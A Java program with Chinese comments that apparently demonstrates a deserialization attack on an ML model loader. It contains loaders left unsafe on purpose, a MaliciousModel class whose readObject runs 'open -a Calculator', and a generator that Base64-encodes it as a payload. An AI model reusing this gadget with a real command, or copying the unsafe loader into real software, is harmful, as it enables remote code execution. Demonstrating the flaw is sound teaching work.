import java.io.*;
import java.util.Base64;

// 模拟机器学习模型类
class MLModel implements Serializable {
    private static final long serialVersionUID = 1L;
    String modelName;
    double accuracy;
}

// 不安全的模型加载器
class ModelLoader {
    public MLModel loadModel(String filePath) {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath))) {
            return (MLModel) ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}

// 恶意类用于攻击
class MaliciousModel implements Serializable {
    private static final long serialVersionUID = 1L;
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("open -a Calculator");
    }
}

// 攻击载荷生成器
class AttackGenerator {
    public static String generatePayload() throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(new MaliciousModel());
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}

// 模拟服务端反序列化处理
class ModelService {
    public void handleModel(String encodedData) {
        try {
            byte[] data = Base64.getDecoder().decode(encodedData);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            ois.readObject(); // 危险的反序列化操作
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 测试类
public class Main {
    public static void main(String[] args) throws Exception {
        // 1. 正常模型序列化
        MLModel model = new MLModel();
        model.modelName = "RandomForest";
        model.accuracy = 0.95;
        
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("model.ser"));
        oos.writeObject(model);
        oos.close();
        
        // 2. 恶意攻击演示
        String payload = AttackGenerator.generatePayload();
        System.out.println("[+] Generated payload: " + payload.substring(0, 50) + "...");
        
        // 3. 模拟服务端处理（存在漏洞）
        ModelService service = new ModelService();
        System.out.println("[!] 正在触发恶意反序列化...");
        service.handleModel(payload);
        
        // 4. 正常加载模型（存在漏洞）
        ModelLoader loader = new ModelLoader();
        MLModel loaded = loader.loadModel("model.ser");
        if (loaded != null) {
            System.out.println("[+] 加载模型: " + loaded.modelName + " (acc: " + loaded.accuracy + ")");
        }
    }
}